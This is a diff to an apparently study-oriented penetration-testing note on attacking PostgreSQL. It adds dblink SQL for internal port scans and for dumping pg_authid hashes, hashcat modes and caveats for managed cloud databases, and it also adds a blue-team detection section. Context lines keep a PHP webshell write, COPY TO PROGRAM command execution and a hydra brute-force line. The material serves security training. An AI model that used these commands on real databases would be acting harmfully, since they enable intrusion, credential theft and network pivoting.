@@ -21,6 +21,7 @@ Open-source object-relational DBMS, the usual back end behind PHP/Python/Node we
 | [[Tools/Scanning/NMAP\|NMAP]] | Fingerprint the service and version (`-sV`), run `pgsql-brute` |
 | [[Tools/Auth/Hydra\|Hydra]] | Online password brute force against 5432 |
 | [[Tools/Auth/Medusa\|Medusa]] | Alternative online brute force (`-M postgres`) |
+| [[Tools/Auth/hashcat\|hashcat]] | Offline cracking of pg login hashes (`-m 12`/`-m 28600`/`-m 11100`) and app-table hashes |
 | [[Tools/Payloads & Shells/metasploit\|metasploit]] | `postgres_login`, `postgres_sql`, `postgres_schemadump` aux modules |
 
 ---
@@ -47,6 +48,8 @@ flowchart TD
 ```
 
 > [!tip] **The branch people miss is the bottom one.** Everyone knows `COPY … TO PROGRAM` once they're superuser. The place you get stuck is when you connected with a *web-app's* DB account (`dbuser`, `webapp`, …) that is **not** a superuser. That account can't get a shell from the DB — but it can read every row the app can, which usually means the users table full of password hashes. That's the win. See the worked example below.
+
+> [!warning] **Managed PostgreSQL (RDS / Azure Database / Cloud SQL) breaks the RCE branch — check first.** On a managed instance there is **no OS-level superuser**: you get a pseudo-super role (`rds_superuser`, `azure_pg_admin`, `cloudsqlsuperuser`) that is deliberately *not* granted `pg_execute_server_program`, `pg_read/write_server_files`, or the ability to `CREATE EXTENSION plpython3u`/`plperlu` (untrusted languages are blocked). So `COPY … TO PROGRAM`, `pg_read_file`, `lo_export`, and UDF RCE all fail even though you look like an admin — the whole right side of the tree collapses to **loot mode**. What you *can* often do: read `pg_authid` (crack hashes), abuse cloud-specific extensions that *are* allowed (`aws_s3` for S3 read/write, `log_fdw`, `dblink`/`postgres_fdw` for internal SSRF), and pivot on any IAM/instance identity the DB service exposes. Fingerprint it early: `SHOW rds.superuser_reserved_connections` (RDS), `SELECT version()` mentioning the vendor, or a hostname like `*.rds.amazonaws.com`.
 
 ---
 
@@ -315,6 +318,26 @@ SELECT exec_cmd('id');
 
 > [!warning] **Two silent failures here.** (1) `plpythonu` without the `3` fails on PG 12+ — use `plpython3u`. (2) `CREATE EXTENSION` errors *"could not open extension control file"* if the `postgresql-plpython3-<ver>` package isn't installed on the server — that's an infra gap, not a syntax mistake; fall back to `COPY … TO PROGRAM`.
 
+### dblink / postgres_fdw — internal SSRF & network pivot
+
+`dblink` and `postgres_fdw` let the *server* open outbound TCP connections. Neither is a "trusted" extension, so `CREATE EXTENSION dblink` needs superuser — but if it's **already installed** (common on shared/managed instances) a granted role can use it. The DB host almost always sits deeper in the network than your VPN foothold, so this turns the DB into an SSRF pivot.
+
+```sql
+CREATE EXTENSION IF NOT EXISTS dblink;                 -- superuser, unless already present
+
+-- Port-scan the internal network by connection-error timing/message:
+--   'Connection refused' = closed/nothing listening; a hang→timeout = filtered;
+--   a Postgres-protocol error = something answered.
+SELECT dblink_connect('host=10.10.10.5 port=6379 user=x password=x dbname=x connect_timeout=3');
+
+-- Reach an internal Postgres you can't route to directly, with creds you looted:
+SELECT * FROM dblink('host=10.10.10.9 user=postgres password=<pw> dbname=postgres',
+                     'SELECT rolname, rolpassword FROM pg_authid')
+        AS t(rolname text, rolpassword text);
+```
+
+> [!note] **Cross-DB queries on the *same* server also go through dblink/postgres_fdw** — a plain connection is bound to one database (`\c` reconnects; there is no `USE db`). To read another DB in the same cluster without reconnecting, `dblink('dbname=otherdb', 'SELECT …')`. On cloud instances `postgres_fdw` (or `aws_s3`) is often the only outbound primitive left after RCE is stripped.
+
 ### Trust auth abuse (pg_hba.conf)
 
 ```bash
@@ -374,6 +397,18 @@ Crack an admin's password → log into the app, **and** try it as an SSH/`su` pa
 
 ---
 
+## Detection & Artefacts
+
+What the blue team sees — and, on an engagement, what to expect to have left behind.
+
+- **`COPY … TO PROGRAM` is only logged if `log_statement = 'all'` (or `'ddl'`/`'mod'` won't catch it) or `log_min_duration_statement` is low enough** — by default neither is set, so the RCE leaves *no SQL audit trail*. The tell is at the OS level: the `postgres` backend process spawns a child (`/bin/sh -c '…'`), visible to EDR/`auditd` (`execve` under a `postgres` parent) but not in the DB logs.
+- **`log_connections`/`log_disconnections`** (off by default) are what catch brute force and unexpected client IPs; check them before assuming your spray was silent.
+- **`CREATE EXTENSION` / `CREATE FUNCTION … LANGUAGE plpython3u` / `CREATE ROLE … SUPERUSER`** are DDL — caught only with `log_statement='ddl'` or `'all'`. New superuser roles are the most durable IOC: `SELECT rolname FROM pg_roles WHERE rolsuper;` should match the known admin set.
+- **Live activity:** `SELECT pid, usename, client_addr, query FROM pg_stat_activity WHERE state <> 'idle';` shows in-flight queries — a running `COPY … TO PROGRAM` or a `dblink` connection appears here.
+- **Files dropped via `lo_export`/`COPY TO`** are owned by the `postgres` OS user and land under a path postgres can write (webroot, `data_directory`); a webshell with `postgres:postgres` ownership in `/var/www` is a giveaway.
+
+---
+
 ## Dangerous Settings
 
 | Setting | Risk |
@@ -384,6 +419,8 @@ Crack an admin's password → log into the app, **and** try it as an SSH/`su` pa
 | `pg_hba.conf` `trust` lines | No-password auth for matching hosts/local |
 | `listen_addresses = '*'` | DB exposed to the network instead of localhost |
 | `plpython3u` / `plperlu` installed | UDF-based RCE for any superuser |
+| `dblink` / `postgres_fdw` extension present | Server-side outbound connections → internal SSRF / port-scan / cross-DB read |
+| Managed pseudo-super (`rds_superuser`, etc.) treated as fully trusted | Blocks RCE but still allows hash dump, `aws_s3`/`dblink` abuse, cloud-identity pivot |
 | Unpatched build (< the Feb-2026 minor releases) | Privesc→RCE class, `CurrentUserId` overwrite |
 | App storing `md5($salt.$pass)` in its own table | Fast offline cracking once you can read the table |
 | `log_connections = off` / no `log_min_duration_statement` | COPY-PROGRAM RCE leaves no audit trail |
@@ -410,11 +447,15 @@ Crack an admin's password → log into the app, **and** try it as an SSH/`su` pa
 | Write webshell | `COPY (SELECT '<?php system($_GET[0]);?>') TO '/var/www/html/sh.php'` |
 | RCE | `COPY (SELECT '') TO PROGRAM 'id'` |
 | RCE (UDF) | `CREATE EXTENSION plpython3u;` → function → `SELECT exec_cmd('id')` |
+| Internal SSRF / port scan | `SELECT dblink_connect('host=10.10.10.5 port=6379 connect_timeout=3 user=x password=x dbname=x')` |
+| Cross-DB / bounce query | `SELECT * FROM dblink('host=… dbname=…','SELECT …') AS t(...)` |
 | Escalate in-DB | `ALTER ROLE me WITH SUPERUSER` (needs CREATEROLE) |
 | Brute force | `hydra -l postgres -P rockyou.txt postgres://host` |
+
+> [!note] **See also** — sibling relational DBs [[Services/Database Services/Oracle TNS|Oracle TNS]], [[Services/Database Services/MSSQL|MSSQL]], [[Services/Database Services/MySQL|MySQL]]. SQL-injection *into* PostgreSQL (stacked queries, `COPY … FROM PROGRAM` via injection) is covered in [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]]. Hash cracking modes in [[Tools/Auth/hashcat|hashcat]].
 
 ---
 
 *Created: 2026-07-13*
-*Updated: 2026-08-18*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
